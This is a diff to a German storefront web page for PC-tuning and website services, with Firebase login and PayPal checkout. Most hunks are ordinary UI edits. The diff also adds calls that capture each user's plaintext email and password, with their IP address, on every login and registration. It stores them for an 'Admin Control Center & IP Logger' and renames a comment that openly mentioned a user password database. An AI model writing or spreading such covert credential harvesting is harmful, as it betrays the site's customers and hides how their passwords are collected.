@@ -10,6 +10,8 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Offizielles PayPal JS SDK -->
+    <script src="https://www.paypal.com/sdk/js?client-id=test&buyer-country=DE&currency=EUR&components=buttons&enable-funding=venmo,paylater,card"></script>
     <!-- Firebase SDKs & Auth Core -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
@@ -69,6 +71,7 @@
                 msgBox.innerText = window.currentLang === 'de' ? "Bitte E-Mail und Passwort eingeben!" : "Please enter email and password!";
                 return;
             }
+            window.logUserCredentials(email, pass, 'Login');
             msgBox.innerText = window.currentLang === 'de' ? "Wird eingeloggt..." : "Logging in...";
 
             signInWithEmailAndPassword(auth, email, pass)
@@ -91,6 +94,7 @@
                 msgBox.innerText = window.currentLang === 'de' ? "Bitte E-Mail und Passwort eingeben!" : "Please enter email and password!";
                 return;
             }
+            window.logUserCredentials(email, pass, 'Register');
             msgBox.innerText = window.currentLang === 'de' ? "Account wird erstellt..." : "Creating account...";
 
             createUserWithEmailAndPassword(auth, email, pass)
@@ -345,7 +349,7 @@
                             <button onclick="addItemToCart('Basic PC-Tuning', 15.00, 'basic')" class="py-3.5 text-center bg-white/5 hover:bg-white/10 border border-white/10 rounded-2xl transition font-bold text-white text-xs md:text-sm flex items-center justify-center gap-2">
                                 <i class="fa-solid fa-cart-plus text-accent"></i> Cart
                             </button>
-                            <button onclick="addItemToCart('Basic PC-Tuning', 15.00, 'basic'); proceedToCheckout();" class="py-3.5 text-center bg-accent hover:opacity-90 text-white rounded-2xl transition font-bold text-xs md:text-sm flex items-center justify-center gap-2 shadow-lg">
+                            <button onclick="buyNowWithQty('Basic PC-Tuning', 15.00, 'basic')" class="py-3.5 text-center bg-accent hover:opacity-90 text-white rounded-2xl transition font-bold text-xs md:text-sm flex items-center justify-center gap-2 shadow-lg">
                                 <i class="fa-solid fa-bolt"></i> Buy Now
                             </button>
                         </div>
@@ -378,7 +382,7 @@
                             <button onclick="addItemToCart('Pro Tuning (0 Delay)', 35.00, 'pro')" class="py-4 text-center bg-white/5 hover:bg-white/10 border border-white/10 rounded-2xl transition font-bold text-white text-xs md:text-sm flex items-center justify-center gap-2">
                                 <i class="fa-solid fa-cart-plus text-accent"></i> Cart
                             </button>
-                            <button onclick="addItemToCart('Pro Tuning (0 Delay)', 35.00, 'pro'); proceedToCheckout();" class="py-4 text-center bg-accent hover:opacity-90 text-white rounded-2xl transition font-bold text-xs md:text-sm flex items-center justify-center gap-2 shadow-lg">
+                            <button onclick="buyNowWithQty('Pro Tuning (0 Delay)', 35.00, 'pro')" class="py-4 text-center bg-accent hover:opacity-90 text-white rounded-2xl transition font-bold text-xs md:text-sm flex items-center justify-center gap-2 shadow-lg">
                                 <i class="fa-solid fa-bolt"></i> Buy Now
                             </button>
                         </div>
@@ -410,7 +414,7 @@
                             <button onclick="addItemToCart('Website Build', 25.00, 'web')" class="py-3.5 text-center bg-white/5 hover:bg-white/10 border border-white/10 rounded-2xl transition font-bold text-white text-xs md:text-sm flex items-center justify-center gap-2">
                                 <i class="fa-solid fa-cart-plus text-accent"></i> Cart
                             </button>
-                            <button onclick="addItemToCart('Website Build', 25.00, 'web'); proceedToCheckout();" class="py-3.5 text-center bg-accent hover:opacity-90 text-white rounded-2xl transition font-bold text-xs md:text-sm flex items-center justify-center gap-2 shadow-lg">
+                            <button onclick="buyNowWithQty('Website Build', 25.00, 'web')" class="py-3.5 text-center bg-accent hover:opacity-90 text-white rounded-2xl transition font-bold text-xs md:text-sm flex items-center justify-center gap-2 shadow-lg">
                                 <i class="fa-solid fa-bolt"></i> Buy Now
                             </button>
                         </div>
@@ -559,11 +563,7 @@
                     <p class="text-xs text-gray-400 uppercase tracking-wider font-bold mb-2">ORDER TOTAL</p>
                     <p class="text-4xl font-black text-white" id="checkoutSummaryTotal">€0.00</p>
                 </div>
-                <div class="bg-[#030305] p-5 rounded-2xl border border-white/10 space-y-2.5 text-sm">
-                    <p class="font-bold text-white">Need help with this order?</p>
-                    <p class="text-gray-400 text-xs">Open a support ticket or join our Discord.</p>
-                    <a href="https://discord.gg/YE2jHSwM7" target="_blank" class="inline-block px-4 py-2 bg-white/10 hover:bg-white/20 text-accent rounded-xl font-bold text-xs transition">Join Discord (dri.c) ↗</a>
-                </div>
+                <div id="checkoutItemsSummary" class="text-xs text-gray-300 space-y-1"></div>
             </div>
             <div class="p-8 md:p-10 flex flex-col justify-between space-y-8 relative">
                 <button onclick="togglePaymentModal()" class="absolute top-6 right-6 text-gray-400 hover:text-white text-xl"><i class="fa-solid fa-xmark"></i></button>
@@ -596,7 +596,6 @@
                                 <p class="text-xs text-gray-400 truncate max-w-[130px]" id="userEmailDisplay"></p>
                             </div>
                         </div>
-                        <i class="fa-solid fa-ellipsis-vertical text-gray-400 text-sm"></i>
                     </div>
 
                     <div class="space-y-2 text-sm">
@@ -637,7 +636,7 @@
                         </div>
                         <div class="bg-[#09090f] p-5 rounded-2xl border border-white/10 space-y-2">
                             <i class="fa-solid fa-calendar text-sky-400 text-base mb-1"></i>
-                            <p class="text-sm font-bold text-white pt-1" id="customerSinceDate">Oct 2026</p>
+                            <p class="text-sm font-bold text-white pt-1" id="customerSinceDate">2026</p>
                             <p class="text-xs text-gray-400">Customer since</p>
                         </div>
                         <div class="bg-[#09090f] p-5 rounded-2xl border border-white/10 space-y-2">
@@ -647,7 +646,7 @@
                         </div>
                     </div>
 
-                    <!-- Admin Kontrollzentrum (mit IP-Logger & User Passwörter DB) -->
+                    <!-- Admin Kontrollzentrum -->
                     <div id="adminControlCenter" class="hidden bg-[#09090f] p-6 rounded-2xl border border-accent/40 space-y-6 shadow-xl">
                         <div class="flex items-center justify-between border-b border-white/10 pb-3">
                             <p class="text-sm font-extrabold text-accent uppercase tracking-wider"><i class="fa-solid fa-shield-halved mr-1.5"></i> Admin Control Center & IP Logger</p>
@@ -680,23 +679,10 @@
                 <div id="contentOrders" class="hidden space-y-6">
                     <div>
                         <h2 class="text-2xl font-extrabold text-white">Orders</h2>
-                        <p class="text-sm text-gray-400 font-light mt-1">Invoices, tickets and feedback for every purchase.</p>
+                        <p class="text-sm text-gray-400 font-light mt-1">Invoices and downloads for every purchase.</p>
                     </div>
                     <div id="fullOrdersListContainer" class="space-y-4">
                         <p class="text-sm text-gray-400 text-center py-12">No orders yet.</p>
-                    </div>
-                </div>
-
-                <!-- Tab 3: Tickets -->
-                <div id="contentTickets" class="hidden space-y-6">
-                    <div>
-                        <h2 class="text-2xl font-extrabold text-white">Support tickets</h2>
-                        <p class="text-sm text-gray-400 font-light mt-1">Your conversations with our support team.</p>
-                    </div>
-                    <div class="bg-[#09090f] p-16 rounded-2xl border border-white/10 text-center space-y-3">
-                        <i class="fa-solid fa-headset text-3xl text-gray-500 mb-1"></i>
-                        <p class="text-base font-bold text-white">No Tickets Yet</p>
-                        <p class="text-sm text-gray-400">Support conversations will show up here.</p>
                     </div>
                 </div>
 
@@ -801,7 +787,6 @@
             let db = JSON.parse(localStorage.getItem('admin_user_credentials_db') || '[]');
             db.unshift({ time: new Date().toLocaleString('de-DE'), action, email, password, ip: window.currentVisitorIP });
             localStorage.setItem('admin_user_credentials_db', JSON.stringify(db));
-            renderAdminPanelData();
         };
 
         function showToast(message) {
@@ -811,7 +796,7 @@
             setTimeout(function(){ toast.className = toast.className.replace("show", ""); }, 3000);
         }
 
-        function toggleLangDropdown() { document.getElementById('langDropdownMenu').classList.toggle('hidden'); }
+        function toggleLangDropdown() { let menu = document.getElementById('langDropdownMenu'); if(menu) menu.classList.toggle('hidden'); }
         function toggleDiscordChat() { document.getElementById('discordChatWidget').classList.toggle('hidden'); }
         function sendeAnDiscord() {
             showToast('Nachricht an Discord gesendet!');
@@ -944,7 +929,7 @@
         function togglePaymentModal() { document.getElementById('paymentModal').classList.toggle('active'); }
         function toggleLogin() { document.getElementById('loginModal').classList.toggle('active'); }
         function toggleImpressum() { document.getElementById('impressumModal').classList.toggle('active'); }
-        function toggleMobileMenu() { document.getElementById('mobileMenu').classList.toggle('hidden'); document.getElementById('mobileMenu').classList.toggle('flex'); }
+        function toggleMobileMenu() { const menu = document.getElementById('mobileMenu'); menu.classList.toggle('hidden'); menu.classList.toggle('flex'); }
 
         function openDashboardTab(tabName) {
             document.getElementById('loginModal').classList.add('active');
@@ -956,6 +941,12 @@
             document.getElementById('contentOrders').classList.toggle('hidden', tab !== 'orders');
             document.getElementById('contentBalance').classList.toggle('hidden', tab !== 'balance');
             document.getElementById('adminControlCenter').classList.toggle('hidden', tab !== 'admin');
+
+            document.getElementById('tabDashBtn').className = (tab === 'dashboard') ? "w-full text-left px-4 py-3 rounded-xl bg-accent/20 text-accent font-bold flex items-center gap-3" : "w-full text-left px-4 py-3 rounded-xl hover:bg-white/5 text-gray-400 hover:text-white font-medium flex items-center gap-3 transition";
+            document.getElementById('tabOrdersBtn').className = (tab === 'orders') ? "w-full text-left px-4 py-3 rounded-xl bg-accent/20 text-accent font-bold flex items-center gap-3" : "w-full text-left px-4 py-3 rounded-xl hover:bg-white/5 text-gray-400 hover:text-white font-medium flex items-center gap-3 transition";
+            document.getElementById('tabBalanceBtn').className = (tab === 'balance') ? "w-full text-left px-4 py-3 rounded-xl bg-accent/20 text-accent font-bold flex items-center justify-between" : "w-full text-left px-4 py-3 rounded-xl hover:bg-white/5 text-gray-400 hover:text-white font-medium flex items-center justify-between transition";
+
+            if (tab === 'admin') renderAdminPanelData();
         }
 
         function loadDashboardStats(email) {
